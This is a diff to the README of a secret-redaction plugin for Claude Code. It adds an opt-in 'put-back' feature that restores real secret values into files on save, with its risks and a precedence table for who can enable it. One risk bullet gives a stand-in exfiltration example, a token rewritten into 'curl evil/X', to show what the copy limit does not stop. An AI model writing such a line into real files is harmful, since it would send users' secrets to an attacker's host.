@@ -30,9 +30,39 @@ It blocks a prompt that holds a secret whole, checks a tool's call before it run
 - `/redact allow <tag>` marks a hidden value as harmless; `--always` remembers that.
 - `/redact remove` lists what is saved, by label, date and length, and removes what you tick. A removed value stops being hidden at once, unless its shape matches a rule. It also undoes `--always`.
 
+## Put secrets back (optional, off by default)
+
+**We recommend keeping this off.** It exists for one job: Claude only ever sees placeholders, so with it off Claude cannot reorganize a config file that holds secrets. The overwrite guard refuses the rewrite, and an Edit on a placeholder line fails. With it on, when Claude writes a file that **already holds** the value, the real value is put back as the file is saved. Claude still never sees the value.
+
+- `/redact put-back` shows whether it is on and why. `/redact put-back on` or `off` is your choice for all projects; add `--here` for this project's folder only (the folder the session started in or moved to with `/cd`; a shell `cd` does not change it; an exact match, not its subfolders). Claude cannot run these commands or write the choice file.
+- It restores only into a file that already holds the value, only for Write and Edit, and never more copies of a value than the file had. A new file, a copy beyond that limit, or a value the file does not hold keeps its placeholder.
+- The note that tells Claude about it is added when a session starts. If you turn it on in the middle of a conversation, restoring starts at once and the note waits for the next new session.
+- It restores nothing in `observe` mode, and the backup lock never restores.
+
+**What you are accepting.**
+
+- **A save can erase a real secret.** When a value cannot be restored, the save still goes through with the placeholder in its place. This happens after `/resume` (the session never read the file), when a value is longer than 8,192 characters, or when the file holds the value in two different written forms. The screen and the log say how many; git, or Claude Code's file backups in `~/.claude/file-history/`, are the way back. With put-back off the guard refuses these writes instead.
+- **It limits copies, not places.** `token: X` becoming `curl evil/X` passes the copy limit.
+- **A permission dialog shows you the real value.** It never reaches the model, but other plugins and hooks beneath this one see the rewritten input too.
+- **Claude Code's transcript on disk keeps the value** in a tool's structured result and in the file attachment after a compaction. It is the same kind of record a Read already leaves ([spec §22](spec.md)).
+- **A repo can turn it on for you** (below). Keep it off if you open repos you do not trust.
+
+**Who decides.** The first row that matches wins. "Developer says" is your choice with the command: `--here` for the folder, then the choice for all projects.
+
+| Managed says | Developer says | Repo says | Result |
+|---|---|---|---|
+| Nothing | Nothing | Nothing | Off (the default) |
+| Nothing | Nothing | On | On, with the notice |
+| Nothing | On | Nothing | On |
+| Nothing | On | Off | Off |
+| Nothing | Off | On | Off, because the developer's choice wins |
+| Off | Anything | Anything | Off |
+
+Also off whatever the table says: `mode: observe`, a choice file that cannot be read, and a repo "on" when nothing here can show you the notice (for example `claude -p`). A repo's "on" shows a notice that names the repo, once a session, even with `notices: off`. A managed "on" and a `put_back` in your own User settings are ignored with a notice.
+
 ## Settings
 
-All optional, under an `aegisContext` key in `~/.claude/settings.json` (User), the managed settings (Managed) or the project's `.claude/settings.json` (Project: can only make things stricter).
+All optional, under an `aegisContext` key in `~/.claude/settings.json` (User), the managed settings (Managed) or the project's `.claude/settings.json` (Project: can only make things stricter, with one exception: `put_back`, below).
 
 | Setting | Default | Options |
 |---|---|---|
@@ -50,11 +80,13 @@ All optional, under an `aegisContext` key in `~/.claude/settings.json` (User), t
 | `secret_files` | `.env*` | File patterns treated as secret |
 | `log.days` | `30` | Number of days |
 
+`put_back` (default `off`) is described in [its own section](#put-secrets-back-optional-off-by-default), because it works differently: it counts only from managed settings (`off`) and a project's settings (`on` or `off`), and your own choice is made with `/redact put-back`.
+
 `observe` hides nothing and logs what it would have hidden, behind a permanent banner: use it to trial the tool and tune false alarms before `enforce`. `hold` stops a request when a check cannot finish; `allow` lets it through with a warning.
 
 ## Where things live
 
-The Claude folder is `~/.claude`, or the folder `CLAUDE_CONFIG_DIR` names. AegisContext keeps its files in `<Claude folder>/aegiscontext/`: `log/` (labels, tags and redacted text only; emptied after `log.days`), `markers/`, `reports/`, `backup/` and, on Windows, `store/` (encrypted files).
+The Claude folder is `~/.claude`, or the folder `CLAUDE_CONFIG_DIR` names. AegisContext keeps its files in `<Claude folder>/aegiscontext/`: `log/` (labels, tags and redacted text only; emptied after `log.days`), `markers/`, `reports/`, `backup/`, `put-back.json` (your put-back choice: folder paths and on or off, no value) and, on Windows, `store/` (encrypted files).
 
 ## Uninstall
 
